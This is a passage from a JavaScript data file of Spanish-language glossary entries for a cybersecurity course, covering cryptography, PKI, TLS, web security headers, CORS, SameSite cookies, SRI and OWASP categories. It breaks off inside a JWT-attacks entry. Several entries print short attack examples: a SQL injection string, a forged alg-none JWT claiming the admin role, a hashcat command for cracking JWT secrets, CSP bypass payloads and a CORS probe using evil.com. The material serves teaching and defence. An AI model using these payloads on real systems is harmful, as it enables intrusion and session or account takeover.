    related: ["RSA", "Intercambio de claves (Diffie-Hellman)", "Cifrado asimétrico y par de claves"],
  },
  {
    id: 203,
    module: 17,
    term: "Intercambio de claves (Diffie-Hellman)",
    short: "Permite a dos partes acordar una clave secreta común sobre un canal inseguro.",
    detail:
      "**Diffie-Hellman (DH)** logra algo que parece magia: dos partes generan una **clave compartida** intercambiando solo valores públicos, sin que un observador pueda deducirla. Su variante moderna **ECDHE** añade *forward secrecy*: cada sesión usa claves efímeras, así que comprometer la clave del servidor no descifra el tráfico pasado.\n" +
      "> 💡 *Forward secrecy* es por qué capturar tráfico hoy no permite descifrarlo aunque roben la clave mañana.",
    examples: [
      "ECDHE en el handshake TLS 1.3 para forward secrecy.",
      "Acordar la clave de sesión de una VPN sin transmitirla.",
    ],
    related: ["ECC", "Cifrado asimétrico y par de claves", "Gestión de claves"],
  },
  {
    id: 204,
    module: 17,
    term: "Firmas digitales",
    short: "Cifrar un hash con la clave privada para probar autenticidad e integridad.",
    detail:
      "Una **firma digital** invierte el cifrado asimétrico: el emisor cifra el **hash** del mensaje con su **clave privada**; cualquiera lo verifica con su **clave pública**. Garantiza **autenticidad** (lo firmó el dueño de la clave), **integridad** (no se alteró) y **no repudio**.",
    examples: [
      "Firmar un certificado, un commit de Git o un binario.",
      "Verificar que una actualización proviene del fabricante.",
    ],
    related: ["Cifrado asimétrico y par de claves", "Función hash", "No repudio"],
  },
  {
    id: 205,
    module: 17,
    term: "Amenaza cuántica y post-quantum",
    short: "Los ordenadores cuánticos romperían RSA/ECC; la criptografía post-cuántica se adelanta.",
    detail:
      "El algoritmo de **Shor** en un ordenador cuántico suficientemente grande **rompería RSA y ECC** (factorización y logaritmo discreto). Aún no existe ese hardware, pero el riesgo **'harvest now, decrypt later'** (capturar hoy, descifrar mañana) es real.\n" +
      "> 💡 El **NIST** ya estandarizó algoritmos **post-cuánticos** (ej. ML-KEM/Kyber, 2024) resistentes a ataques cuánticos.",
    examples: [
      "Adoptar TLS híbrido clásico + post-cuántico de forma anticipada.",
      "Datos sensibles a largo plazo cifrados pensando en la amenaza cuántica.",
    ],
    related: ["RSA", "ECC", "Gestión de claves"],
  },

  // ── M18 · Hashing y PKI ──────────────────────────────────────────────────
  {
    id: 210,
    module: 18,
    term: "Función hash",
    short: "Transforma cualquier dato en una huella de tamaño fijo, irreversible y única.",
    detail:
      "Una **función hash** (SHA-256) produce una **huella de longitud fija** a partir de cualquier entrada. Propiedades clave:\n" +
      "• **Unidireccional** — no se puede revertir al original.\n" +
      "• **Efecto avalancha** — un cambio mínimo altera todo el hash.\n" +
      "• **Resistente a colisiones** — inviable hallar dos entradas con el mismo hash.\n" +
      "> ⚠️ **MD5** y **SHA-1** están rotos (colisiones); usar **SHA-256** o superior.",
    examples: [
      "Verificar la integridad de una descarga comparando su SHA-256.",
      "Almacenar huellas de archivos como IoC.",
    ],
    related: ["Salting y key stretching", "Firmas digitales", "Integridad"],
  },
  {
    id: 211,
    module: 18,
    term: "Salting y key stretching",
    short: "Cómo almacenar contraseñas de forma segura: sal única + funciones lentas a propósito.",
    detail:
      "Hashear contraseñas con SHA rápido **no basta**. Se añade:\n" +
      "• **Salt** — valor aleatorio único por contraseña; frustra las **rainbow tables** y evita que dos claves iguales den el mismo hash.\n" +
      "• **Key stretching** — algoritmos **lentos a propósito** (bcrypt, scrypt, Argon2) que encarecen la fuerza bruta.\n" +
      "| Función | Apta para contraseñas |\n" +
      "|---|---|\n" +
      "| MD5 / SHA-256 | No (demasiado rápidas) |\n" +
      "| bcrypt / Argon2 | Sí (lentas + salt) |\n" +
      "> ⚠️ Una **rainbow table** precomputa hashes; la **sal** la inutiliza.",
    examples: [
      "Guardar contraseñas con Argon2id y sal por usuario.",
      "bcrypt con factor de coste ajustable al hardware.",
    ],
    related: ["Función hash", "PKI y autoridades de certificación", "Confidencialidad"],
  },
  {
    id: 212,
    module: 18,
    term: "PKI y autoridades de certificación",
    short: "El sistema que vincula una clave pública con una identidad mediante certificados firmados.",
    detail:
      "La **PKI** (*Public Key Infrastructure*) resuelve '¿esta clave pública es realmente de quien dice ser?'. Una **CA** (*Certificate Authority*) de confianza **firma** certificados que ligan una clave pública a una identidad (dominio, persona). El navegador confía en un conjunto de **CA raíz** preinstaladas.",
    examples: [
      "Let's Encrypt emitiendo el certificado TLS de un dominio.",
      "El candado del navegador = certificado válido firmado por una CA confiable.",
    ],
    related: ["Cadena de confianza", "Firmas digitales", "Certificate transparency y pinning"],
  },
  {
    id: 213,
    module: 18,
    term: "Cadena de confianza",
    short: "La validación de un certificado sube desde el del servidor hasta una CA raíz de confianza.",
    detail:
      "Un certificado no se confía aislado: forma una **cadena**. El certificado del **servidor (leaf)** está firmado por una **CA intermedia**, firmada a su vez por una **CA raíz** en la que el sistema ya confía. Si algún eslabón falla (expirado, revocado, firma inválida), la cadena se rompe y el navegador alerta.\n" +
      "> 💡 Ver el diagrama 'Cadena de confianza PKI' más abajo.",
    examples: [
      "Leaf → CA intermedia → CA raíz: el navegador valida toda la cadena.",
      "Un certificado revocado (CRL/OCSP) rompe la confianza.",
    ],
    related: ["PKI y autoridades de certificación", "Certificate transparency y pinning"],
  },
  {
    id: 214,
    module: 18,
    term: "Certificate transparency y pinning",
    short: "Mecanismos extra para detectar certificados fraudulentos y atar un cliente a uno concreto.",
    detail:
      "Dos defensas contra CA comprometidas o certificados emitidos por error:\n" +
      "• **Certificate Transparency (CT)** — logs públicos y auditables de todos los certificados emitidos; permite detectar emisiones no autorizadas.\n" +
      "• **Certificate pinning** — la app fija el certificado/clave esperado, rechazando cualquier otro aunque sea 'válido' para una CA.\n" +
      "> ⚠️ El pinning mal gestionado puede romper la app al rotar certificados.",
    examples: [
      "Apps móviles que hacen pinning de su API contra MITM.",
      "Detectar vía CT un certificado emitido fraudulentamente para tu dominio.",
    ],
    related: ["Cadena de confianza", "PKI y autoridades de certificación", "Ataques a TLS"],
  },

  // ── M19 · TLS/SSL y VPN ──────────────────────────────────────────────────
  {
    id: 220,
    module: 19,
    term: "TLS 1.2 vs 1.3",
    short: "TLS 1.3 es más rápido y seguro: menos viajes, solo cifrados modernos.",
    detail:
      "**TLS** cifra el tráfico (la 'S' de HTTPS). La versión 1.3 fue una limpieza profunda:\n" +
      "| | TLS 1.2 | TLS 1.3 |\n" +
      "|---|---|---|\n" +
      "| Handshake | 2 RTT | 1 RTT (0-RTT opcional) |\n" +
      "| Cifrados | Muchos (algunos débiles) | Solo AEAD modernos |\n" +
      "| Forward secrecy | Opcional | Siempre (ECDHE) |\n" +
      "> ⚠️ SSL y TLS 1.0/1.1 están **obsoletos e inseguros**: deshabilitarlos.",
    examples: [
      "TLS 1.3 reduce la latencia del handshake a un solo viaje.",
      "Deshabilitar TLS 1.0/1.1 en el servidor por cumplimiento.",
    ],
    related: ["Cipher suite", "Ataques a TLS"],
  },
  {
    id: 221,
    module: 19,
    term: "Cipher suite",
    short: "El conjunto de algoritmos que cliente y servidor acuerdan para una conexión TLS.",
    detail:
      "Una **cipher suite** define la combinación de algoritmos de una sesión: **intercambio de claves** (ECDHE), **autenticación** (RSA/ECDSA), **cifrado simétrico** (AES-GCM) y **hash** (SHA-256). En el handshake, cliente y servidor negocian la suite más fuerte que ambos soporten.",
    examples: [
      "TLS_AES_256_GCM_SHA384 (una suite de TLS 1.3).",
      "Evitar suites con RC4, 3DES o sin forward secrecy.",
    ],
    related: ["TLS 1.2 vs 1.3", "Modos de operación"],
  },
  {
    id: 222,
    module: 19,
    term: "VPN: IPSec vs WireGuard",
    short: "Túneles cifrados entre redes; WireGuard es moderno, simple y rápido frente a IPSec.",
    detail:
      "Una **VPN** crea un **túnel cifrado** sobre una red insegura. Dos enfoques:\n" +
      "| | IPSec | WireGuard |\n" +
      "|---|---|---|\n" +
      "| Madurez | Veterano, ubicuo | Moderno |\n" +
      "| Complejidad | Alta | Muy baja |\n" +
      "| Cripto | Configurable | Fija y moderna (Curve25519) |\n" +
      "| Rendimiento | Bueno | Excelente |\n" +
      "> 💡 WireGuard vive en el kernel y tiene una base de código diminuta, más fácil de auditar.",
    examples: [
      "WireGuard para una VPN personal rápida y simple.",
      "IPSec en escenarios corporativos/legacy con equipos heterogéneos.",
    ],
    related: ["TLS 1.2 vs 1.3", "Intercambio de claves (Diffie-Hellman)", "Cifrado simétrico"],
  },
  {
    id: 223,
    module: 19,
    term: "Ataques a TLS",
    short: "La mayoría no rompen el cifrado: degradan la conexión o evitan que se cifre.",
    detail:
      "TLS bien configurado es sólido; los ataques apuntan a los **bordes**:\n" +
      "• **SSL stripping** — un MITM fuerza HTTP en vez de HTTPS para leer en claro.\n" +
      "• **Downgrade** — engaña para negociar una versión/suite débil.\n" +
      "• **Vulnerabilidades históricas** — POODLE, Heartbleed, BEAST (de versiones/implementaciones viejas).\n" +
      "> 💡 **HSTS** obliga al navegador a usar siempre HTTPS, frustrando el SSL stripping.",
    examples: [
      "Un MITM en WiFi público intentando SSL stripping.",
      "Cabecera HSTS + precarga para evitar el primer salto en claro.",
    ],
    related: ["TLS 1.2 vs 1.3", "Certificate transparency y pinning"],
  },

  // ── M20 · Seguridad Web: Fundamentos ─────────────────────────────────────
  {
    id: 230,
    module: 20,
    term: "Arquitectura cliente-servidor y HTTP",
    short: "El navegador (cliente) pide recursos vía HTTP a un servidor que responde.",
    detail:
      "La web funciona con **peticiones HTTP**: el cliente envía un **método** (GET, POST…) a una URL y el servidor devuelve un **código de estado** (200, 404, 500) y un cuerpo. HTTP es **sin estado**, por eso se usan **cookies/tokens** para mantener la sesión.\n" +
      "> 💡 Entender la petición/respuesta cruda (cabeceras incluidas) es la base de todo pentest web; herramientas como Burp Suite las interceptan.",
    examples: [
      "GET /perfil devuelve 200 con el HTML del perfil.",
      "Un 401/403 indica falta de autenticación/autorización.",
    ],
    related: ["Same-Origin Policy", "Headers de seguridad", "Cookie security"],
  },
  {
    id: 231,
    module: 20,
    term: "Same-Origin Policy",
    short: "Regla del navegador: un origen no puede leer recursos de otro origen distinto.",
    detail:
      "La **Same-Origin Policy (SOP)** es la defensa base del navegador: por defecto, una página solo puede leer datos de su **mismo origen** (mismo **protocolo + dominio + puerto**). Impide que un sitio malicioso lea tu sesión de otro.\n" +
      "| Comparado con https://app.com:443 | ¿Mismo origen? |\n" +
      "|---|---|\n" +
      "| https://app.com/otra | Sí |\n" +
      "| http://app.com | No (protocolo) |\n" +
      "| https://api.app.com | No (subdominio) |",
    examples: [
      "Un sitio atacante no puede leer tu webmail abierto en otra pestaña.",
      "Para compartir datos entre orígenes se necesita CORS.",
    ],
    related: ["CORS", "Cookie security", "Arquitectura cliente-servidor y HTTP"],
  },
  {
    id: 232,
    module: 20,
    term: "CORS",
    short: "Mecanismo para relajar la Same-Origin Policy de forma controlada.",
    detail:
      "**CORS** (*Cross-Origin Resource Sharing*) permite que un servidor autorice explícitamente a otros orígenes mediante cabeceras (`Access-Control-Allow-Origin`). Es necesario para APIs consumidas desde otro dominio.\n" +
      "> ⚠️ Mal configurado es peligroso: `Access-Control-Allow-Origin: *` **junto con** credenciales, o reflejar el `Origin` sin validar, expone datos a cualquier sitio.",
    examples: [
      "Una API que permite el origen https://app.com pero no otros.",
      "El antipatrón: reflejar cualquier Origin con allow-credentials.",
    ],
    related: ["Same-Origin Policy", "Headers de seguridad", "Cookie security"],
  },
  {
    id: 233,
    module: 20,
    term: "Headers de seguridad",
    short: "Cabeceras de respuesta que endurecen el navegador contra ataques comunes.",
    detail:
      "El servidor puede enviar cabeceras que activan defensas en el cliente:\n" +
      "| Header | Protege contra |\n" +
      "|---|---|\n" +
      "| Content-Security-Policy | XSS / inyección de recursos |\n" +
      "| Strict-Transport-Security | SSL stripping (fuerza HTTPS) |\n" +
      "| X-Frame-Options / frame-ancestors | Clickjacking |\n" +
      "| X-Content-Type-Options: nosniff | MIME sniffing |\n" +
      "> 💡 **CSP** es la más potente contra XSS: define de qué orígenes pueden cargarse scripts y recursos.",
    examples: [
      "Una CSP estricta bloquea scripts inline inyectados.",
      "HSTS evita el primer salto en HTTP plano.",
    ],
    related: ["Cookie security", "CORS", "Cross-Site Scripting (XSS)"],
  },
  {
    id: 234,
    module: 20,
    term: "Cookie security",
    short: "Atributos de las cookies que limitan su robo y su uso en ataques.",
    detail:
      "Las cookies de sesión son un objetivo principal. Sus atributos defensivos:\n" +
      "• **HttpOnly** — inaccesible desde JavaScript (mitiga el robo por XSS).\n" +
      "• **Secure** — solo se envía por HTTPS.\n" +
      "• **SameSite** (Lax/Strict) — no se envía en peticiones cross-site (mitiga CSRF).\n" +
      "> 💡 En AlphaLog, la cookie CSRF `al_csrf` y el patrón SameSite=Lax son parte de esta defensa.",
    examples: [
      "Cookie de sesión con HttpOnly + Secure + SameSite=Lax.",
      "Sin HttpOnly, un XSS roba la sesión con document.cookie.",
    ],
    related: ["Headers de seguridad", "Cross-Site Request Forgery (CSRF)", "Cross-Site Scripting (XSS)"],
  },
  {
    id: 235,
    module: 20,
    term: "Content Security Policy (CSP) moderno",
    short: "Whitelist declarativa de orígenes ejecutables — la defensa canónica contra XSS. Nonce + strict-dynamic es el gold standard 2025.",
    detail:
      "La **CSP** le dice al navegador **qué recursos puede cargar/ejecutar** cada página. Es el control primario contra XSS reflected/stored/DOM.\n" +
      "\n**Evolución:**\n" +
      "| Nivel | Enfoque | Debilidad |\n" +
      "|---|---|---|\n" +
      "| CSP 1.0 (2012) | Whitelist de hosts (`script-src cdn.com`) | Bypass por JSONP, gadgets AngularJS |\n" +
      "| CSP 2.0 | Añade `nonce-*` y `sha256-*` | Correcto pero cascada rota si se pierde nonce |\n" +
      "| **CSP 3.0** (2024) | **`nonce` + `strict-dynamic`** | Menos bypasses documentados |\n" +
      "| **Trusted Types** | Fuerza que asignaciones DOM peligrosas (`innerHTML`) pasen por una policy | Cierra DOM XSS |\n" +
      "\n**El gold standard hoy:**\n" +
      "```\nContent-Security-Policy:\n  script-src 'nonce-r4nd0m' 'strict-dynamic';\n  object-src 'none';\n  base-uri 'none';\n  require-trusted-types-for 'script';\n```\n" +
      "\n**Bypasses clásicos que evitar:**\n" +
      "• Whitelist con **JSONP endpoints** (`cdnjs`, `googleapis`): el atacante llama `?callback=alert` → RCE.\n" +
      "• `data:` / `blob:` en `script-src` (permite `<script src=\"data:,alert(1)\">`).\n" +
      "• Falta de `base-uri`: `<base href=\"//evil\">` reescribe URLs relativas.\n" +
      "• Falta de `object-src 'none'`: `<object>` / `<embed>` con Flash/PDF.\n" +
      "> 💡 **Google usa CSP con Trusted Types en gmail, YouTube y Docs**; corta el 99% de XSS DOM antes de que ejecute.\n" +
      "> ⚠️ CSP en `Content-Security-Policy-Report-Only` primero para tunear, luego enforce. Nunca desplegar CSP directamente en prod sin telemetría.",
    examples: [
      "GitHub 2016: eliminó inline scripts + adoptó nonce-based CSP y cayó su tasa de XSS.",
      "Trusted Types en aplicación React: forzar que `dangerouslySetInnerHTML` pase por policy.",
      "Report-only rollout: `report-uri /csp-log` durante 2 semanas antes del enforce.",
    ],
    related: ["Cross-Site Scripting (XSS)", "Headers de seguridad", "Same-Site cookies y CSRF sin token", "DOM-based XSS y sinks modernos"],
  },
  {
    id: 236,
    module: 20,
    term: "Same-Site cookies y CSRF sin token",
    short: "El atributo SameSite convierte al navegador en el defensor primario contra CSRF, obsoletando los tokens en la mayoría de casos.",
    detail:
      "El atributo **`SameSite`** de cookies define si el navegador las envía en requests **cross-site**:\n" +
      "\n| Valor | Envío en cross-site | Uso típico |\n" +
      "|---|---|---|\n" +
      "| `Strict` | Nunca | Cookies de auth super sensibles (banca) |\n" +
      "| `Lax` (default 2020+) | Solo en top-level navigations GET | Default sano para 99% de cookies |\n" +
      "| `None` + `Secure` | Sí, requiere HTTPS | Cookies de embeds cross-origin |\n" +
      "\n**Chrome cambió el default a `Lax` en 2020** (Firefox y Edge siguieron). Impacto: CSRF con `POST` ya no funciona vía formulario cross-site — la cookie de sesión **no viaja**.\n" +
      "\n**Contexto histórico:** antes se usaban **CSRF tokens** en cada form. Hoy siguen recomendados como defensa en profundidad, pero SameSite=Lax cierra la superficie primaria.\n" +
      "\n**Bypasses de SameSite que hay que conocer:**\n" +
      "• **Subdominios propios** — `SameSite` es *same-site*, no *same-origin*. Un XSS en `blog.miapp.com` puede hacer requests con cookies a `api.miapp.com`.\n" +
      "• **Top-level GET** — un link phishing `<a href=\"https://banco.com/transfer?to=evil\">click aquí</a>` sí incluye la cookie con `Lax`. Fix: acciones sensibles solo por POST.\n" +
      "• **Lax + 2 minutes grace period** (Chrome): en los primeros 2 min tras crear la cookie, se comporta como `None`. Explotable en OAuth flows.\n" +
      "> 💡 La regla moderna: `Secure; HttpOnly; SameSite=Lax` como default; `Strict` para las super sensibles; `None; Secure` solo si realmente hay embedding cross-origin justificado.\n" +
      "> ⚠️ El atributo `__Host-` prefix (Chrome) fuerza `Secure` + `Path=/` + sin `Domain=` — cierra fixation attacks vía subdominios.",
    examples: [
      "Migración a SameSite=Lax: eliminó CSRF por POST-form del pentesting normal en 2020.",
      "OAuth flow con SameSite=Lax: pass. Con Strict: fallaría porque el redirect es cross-site.",
      "`Set-Cookie: __Host-session=X; Secure; HttpOnly; SameSite=Strict; Path=/`",
    ],
    related: ["Cross-Site Request Forgery (CSRF)", "Content Security Policy (CSP) moderno", "Headers de seguridad", "CORS y preflight abuse"],
  },
  {
    id: 237,
    module: 20,
    term: "CORS y preflight abuse",
    short: "Access-Control-Allow-Credentials: true + Origin reflejado sin whitelist es RCE en tu API disfrazado de misconfiguration.",
    detail:
      "El **CORS** (Cross-Origin Resource Sharing) relaja la Same-Origin Policy para permitir que un origen A haga requests a un origen B. Es la puerta entre `app.com` y `api.app.com`. Mal configurada, es un **backdoor de exfiltración**.\n" +
      "\n**Headers clave:**\n" +
      "| Header | Función | Peligro |\n" +
      "|---|---|---|\n" +
      "| `Access-Control-Allow-Origin` | Qué origen puede leer la response | Reflejar `Origin` sin whitelist = cualquiera |\n" +
      "| `Access-Control-Allow-Credentials: true` | Permite mandar cookies/auth | Combinado con reflejo de Origin = catastrófico |\n" +
      "| `Access-Control-Allow-Methods` | Métodos permitidos (GET, POST, ...) | Amplio = fácil de abusar |\n" +
      "| `Access-Control-Allow-Headers` | Headers custom permitidos | Amplio = injection lateral |\n" +
      "\n**Anti-patrones de misconfiguration:**\n" +
      "```\n// FATAL: cualquier origen puede leer con cookies\nAccess-Control-Allow-Origin: <reflejo del Origin del request>\nAccess-Control-Allow-Credentials: true\n\n// Peligroso: null origin (viene de <iframe sandbox>, data:, file://)\nAccess-Control-Allow-Origin: null  // \"null\" es una string válida\n\n// Wildcard con creds — el browser lo rechaza, pero el server lo declara mal\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true  // Contradictorio\n```\n" +
      "\n**Preflight (`OPTIONS`)** — antes de PUT/DELETE/custom-header requests, el browser hace un `OPTIONS` primero. Muchas apps tratan el OPTIONS diferente (skip auth), lo que abre vectores.\n" +
      "> 💡 **Test rápido:** manda un request con `Origin: https://evil.com` — si la response tiene `Access-Control-Allow-Origin: https://evil.com`, la config refleja y es explotable.\n" +
      "> ⚠️ Casos reales: bugs en Facebook, Twitter, Bitbucket, GitHub — todos por CORS mal configurado leaked auth tokens en 2016-2020.",
    examples: [
      "PortSwigger: bounty de $10K en un CORS con `Origin` reflejado + credentials=true.",
      "Whitelist estricta: comparar `Origin` contra `['https://app.com', 'https://app.mobile']` exacto.",
      "GitHub Enterprise 2020: CVE-2020-10516 — CORS reflection leaked API tokens.",
    ],
    related: ["Same-Site cookies y CSRF sin token", "Headers de seguridad", "Cross-Site Request Forgery (CSRF)", "JWT attacks: alg=none, key confusion, weak secret"],
  },
  {
    id: 238,
    module: 20,
    term: "HSTS, HPKP y downgrade attacks",
    short: "HSTS previene el TLS strip; HPKP quedó deprecado por lock-out; ambos son parte del hardening de headers.",
    detail:
      "**HSTS** (*HTTP Strict Transport Security*) le dice al navegador: *'con este dominio, siempre usá HTTPS'* aunque el usuario tipee `http://`. Corta el ataque **SSL Strip** (Moxie Marlinspike, 2009): un MITM que reescribe redirects HTTPS→HTTP.\n" +
      "\n**Header canónico:**\n" +
      "```\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n```\n" +
      "\n**Componentes:**\n" +
      "| Directiva | Efecto |\n" +
      "|---|---|\n" +
      "| `max-age=N` | El browser recuerda por N segundos que el dominio es HTTPS-only |\n" +
      "| `includeSubDomains` | Aplica a *.tudominio.com también |\n" +
      "| `preload` | Solicita inclusión en la **HSTS Preload List** de Chrome/Firefox — el browser sabe antes del primer visit |\n" +
      "\n**HSTS Preload List** — https://hstspreload.org/ mantiene una lista incluida en Chromium; cualquier navegador basado en Chromium (Chrome, Edge, Brave, Opera) sabe de tu dominio antes de que lo visite. Enviar preload es prácticamente **irreversible** (delays de meses).\n" +
      "\n**HPKP** (*HTTP Public Key Pinning*) — deprecado en 2018. Idea: pinar el hash de tu cert público en el browser. Problema: si tu CA cambiaba o perdías la clave privada del pin, quedabas **bloqueado meses**. Reemplazado por **Certificate Transparency + Expect-CT** (también deprecado 2022) y hoy por SCT extension nativa en el cert.\n" +
      "\n**Downgrade attacks todavía existen:**\n" +
      "• **SSL Strip 2** (2013) — bypass de HSTS con dominios sin preload en la primera visita.\n" +
      "• **DROWN** (2016) — server con SSLv2 permite crackear TLS moderno del mismo cert.\n" +
      "• **POODLE** (2014) — force downgrade a SSLv3, oracle en padding CBC.\n" +
      "> 💡 Nunca uses HTTP redirect a HTTPS **sin HSTS**. Sin HSTS, un MITM intercepta el HTTP inicial y hace strip.\n" +
      "> ⚠️ `max-age=0` desregistra HSTS. Útil para rollback controlado; peligroso si accidentalmente lo mandás en prod.",
    examples: [
      "Migración de max-age=31536000 (1 año) desde max-age=0: rollout progresivo.",
      "Preload: agregar `preload` al header + submit a hstspreload.org.",
      "Test con `curl -I https://tudominio.com | grep -i hsts` para verificar.",
    ],
    related: ["Headers de seguridad", "Content Security Policy (CSP) moderno", "Subresource Integrity (SRI)", "Same-Site cookies y CSRF sin token"],
  },
  {
    id: 239,
    module: 20,
    term: "Subresource Integrity (SRI)",
    short: "Un hash criptográfico en <script src=...> asegura que el CDN no sirvió una versión modificada. Defensa contra compromiso de CDN.",
    detail:
      "Cuando cargás un script desde un CDN (`unpkg`, `jsdelivr`, `cdnjs`), el navegador **confía** en el CDN. Si el CDN es comprometido (BGP hijack, cuenta admin robada), sirve un JS malicioso y **todas** las webs que lo consumen quedan comprometidas.\n" +
      "\n**SRI** (Subresource Integrity, W3C) fuerza al navegador a **verificar el hash** del recurso:\n" +
      "```html\n<script src=\"https://cdn.example.com/lib.js\"\n  integrity=\"sha384-abc123...\"\n  crossorigin=\"anonymous\">\n</script>\n```\n" +
      "Si el hash no coincide, **el navegador rechaza el recurso**. El CDN puede servir lo que quiera; el browser no ejecuta.\n" +
      "\n**Formato del hash:**\n" +
      "• Algoritmos: `sha256`, `sha384`, `sha512` (SHA-1 y MD5 deprecados).\n" +
      "• Múltiples permitidos: `integrity=\"sha384-hash1 sha384-hash2\"` para rollout.\n" +
      "• Generación: `openssl dgst -sha384 -binary file.js | openssl base64 -A`.\n" +
      "\n**Requisito CORS:** SRI requiere `crossorigin=\"anonymous\"` — el CDN debe habilitar CORS para el request. Sin CORS, el browser no puede verificar y bloquea silenciosamente.\n" +
      "\n**Casos donde SRI ayuda:**\n" +
      "• **CDN comprometido** — el hash cambia, browser rechaza.\n" +
      "• **BGP hijack** — el atacante sirve otro contenido, browser rechaza.\n" +
      "• **CDN quebró** — hash no matchea (cambio de versión sin update), browser rechaza. Rompe la app, pero de forma segura.\n" +
      "\n**Casos donde SRI NO ayuda:**\n" +
      "• **Repositorio del CDN comprometido en origen** — si el atacante actualiza la lib con backdoor Y todos los consumidores bajan el nuevo hash sin auditar.\n" +
      "• **Attacker controls el HTML** — si hay XSS, el atacante inyecta su propio `<script>` sin SRI.\n" +
      "> 💡 En 2018 el compromiso de la lib `event-stream` (npm) inyectó un stealer de Bitcoin. SRI no lo habría prevenido — el hash del atacante era válido. **La supply chain moderna requiere provenance + SRI + audit.**\n" +
      "> ⚠️ Frameworks modernos (webpack, Vite) generan SRI automático para chunks. Verificar que el build los emita.",
    examples: [
      "Bootstrap CDN: `<link rel=\"stylesheet\" href=\"...\" integrity=\"sha384-...\" crossorigin=\"anonymous\">`.",
      "Auditoría: `grep -r '<script src=\"https://' | grep -v integrity=` — encontrar scripts sin SRI.",
      "Auto-generación con webpack-subresource-integrity plugin.",
    ],
    related: ["Content Security Policy (CSP) moderno", "Dependency scanning (SCA)", "Supply chain de imágenes (cosign / Sigstore / SLSA)", "HSTS, HPKP y downgrade attacks"],
  },

  // ── M21 · OWASP Top 10 (Parte 1) ─────────────────────────────────────────
  {
    id: 240,
    module: 21,
    term: "OWASP Top 10",
    short: "El estándar de facto de los 10 riesgos de seguridad web más críticos.",
    detail:
      "El **OWASP Top 10** es una lista consensuada y periódica (última: **2021**) de las categorías de riesgo más serias en aplicaciones web. No es un checklist exhaustivo, sino una **referencia de concienciación y prioridad**.\n" +
      "> 💡 Ver el diagrama 'OWASP Top 10 (2021)' más abajo para las 10 categorías con su mitigación.",
    examples: [
      "Usar el Top 10 como base mínima en un pentest web.",
      "Mapear hallazgos a categorías A01-A10 en un reporte.",
    ],
    related: ["Broken Access Control", "Injection", "Insecure Design y Security Misconfiguration"],
  },
  {
    id: 241,
    module: 21,
    term: "Broken Access Control",
    short: "A01: usuarios acceden a datos o acciones que no les corresponden.",
    detail:
      "**A01 (el #1 actual)**: fallos en la autorización. El más común es el **IDOR** (*Insecure Direct Object Reference*): cambiar un identificador para ver datos ajenos. También incluye **escalada** vertical (a admin) u horizontal (a otro usuario).\n" +
      "/api/user/123  →  /api/user/124\n" +
      "> ⚠️ La autorización debe verificarse **en el servidor**, en cada petición — nunca confiar en el cliente.",
    examples: [
      "Cambiar /factura/123 por /factura/124 y ver la de otro cliente.",
      "Acceder a /admin sin ser administrador (forced browsing).",
    ],
    related: ["IDOR y referencias inseguras", "OWASP Top 10", "Principio de mínimo privilegio"],
  },
  {
    id: 242,
    module: 21,
    term: "Cryptographic Failures",
    short: "A02: datos sensibles mal protegidos (sin cifrar, cripto débil, claves expuestas).",
    detail:
      "**A02** cubre la protección deficiente de datos: transmisión sin TLS, almacenamiento sin cifrar, **hashes obsoletos** (MD5/SHA-1) para contraseñas, o **claves/credenciales expuestas** en el código. El foco: clasificar qué datos son sensibles y cifrarlos en tránsito y en reposo.",
    examples: [
      "Contraseñas guardadas con MD5 sin sal.",
      "Una API key hardcodeada en el repositorio.",
    ],
    related: ["Salting y key stretching", "TLS 1.2 vs 1.3", "OWASP Top 10"],
  },
  {
    id: 243,
    module: 21,
    term: "Injection",
    short: "A03: entrada no confiable se interpreta como código o comando (SQLi, XSS, etc.).",
    detail:
      "**A03** ocurre cuando datos del usuario se mezclan con un intérprete sin separación: **SQL Injection**, **XSS**, inyección de comandos OS, LDAP, etc. La causa raíz es **mezclar datos y código**.\n" +
      "> 💡 Defensa transversal: **consultas parametrizadas**, validación de entrada y **codificación de salida**. Ver el módulo de SQLi/XSS para el detalle.",
    examples: [
      "' OR 1=1 -- en un login vulnerable.",
      "Un comentario con <script> que se ejecuta en otros usuarios.",
    ],
    related: ["SQL Injection", "Cross-Site Scripting (XSS)", "OWASP Top 10"],
  },
  {
    id: 244,
    module: 21,
    term: "Insecure Design y Security Misconfiguration",
    short: "A04 y A05: fallos de diseño desde el origen y configuraciones inseguras.",
    detail:
      "Dos categorías relacionadas:\n" +
      "• **A04 Insecure Design** — el fallo está en el **diseño**, no en un bug puntual: faltó *threat modeling*, controles inexistentes por concepto.\n" +
      "• **A05 Security Misconfiguration** — causa de innumerables brechas: credenciales por defecto, servicios/puertos innecesarios, errores verbosos (stack traces), **buckets S3 públicos**, headers ausentes, software sin actualizar.",
    examples: [
      "Una consola de admin con usuario/clave 'admin/admin'.",
      "Un bucket de almacenamiento expuesto públicamente por error.",
    ],
    related: ["Hardening y CIS Benchmarks", "Headers de seguridad", "OWASP Top 10"],
  },
  {
    id: 245,
    module: 21,
    term: "JWT attacks: alg=none, key confusion, weak secret",
    short: "El header alg del JWT es un vector de escalada. alg=none, HS256↔RS256 confusion y HMAC con secret débil son las 3 clásicas.",
    detail:
      "Un **JWT** (JSON Web Token) es `header.payload.signature` en base64url. El header declara `alg` (algoritmo de firma). Si el servidor **no valida rigurosamente el alg**, hay escalada trivial:\n" +
      "\n**1. `alg: 'none'` — la firma se ignora**\n" +
      "```json\n// Header\n{ \"alg\": \"none\", \"typ\": \"JWT\" }\n// Payload\n{ \"sub\": \"admin\", \"role\": \"admin\" }\n// Signature: vacía\n```\n" +
      "Se envía sin firma; librerías viejas aceptan. Fix: whitelist explícita de algs.\n" +
      "\n**2. Key confusion: HS256 ↔ RS256**\n" +
      "El servidor espera **RS256** (asimétrico, verifica con clave pública). El atacante toma la **clave pública** (que suele ser pública, ¡obvio!) y firma con **HS256** (HMAC simétrico) usándola como secret. Si el servidor no verifica el alg antes de decidir la key, valida con HMAC(publica) = OK.\n" +
      "\n**3. HMAC con secret débil (HS256)**\n" +
      "El servidor firma con HS256 usando un secret. Si el secret es `secret`, `password123`, `jwt_secret`, `changeme`, el atacante lo crackea offline con **hashcat mode 16500**:\n" +
      "```\nhashcat -a 0 -m 16500 jwt.txt rockyou.txt\n```\n" +
      "Con el secret, forja tokens arbitrarios.\n" +
      "\n**4. `kid` injection**\n" +
      "Algunos JWTs incluyen `kid` (key id) en el header, que la app usa para buscar la clave. Si es reflejado en un query DB o path, → SQLi / path traversal / RCE.\n" +
      "\n**5. `jku` / `x5u` — remote key**\n" +
